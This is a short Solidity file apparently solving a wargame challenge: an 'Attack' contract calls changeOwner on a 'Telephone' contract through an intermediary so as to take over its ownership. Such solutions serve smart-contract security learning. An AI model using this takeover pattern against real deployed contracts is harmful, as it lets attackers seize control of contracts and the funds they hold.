// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

        interface Telephone{
            function changeOwner(address _owner) external;

        }

        contract Attack {
            function Hack(address _addr, address _owner) public{
                Telephone telephone = Telephone(_addr);
                telephone.changeOwner(_owner);
            }
}

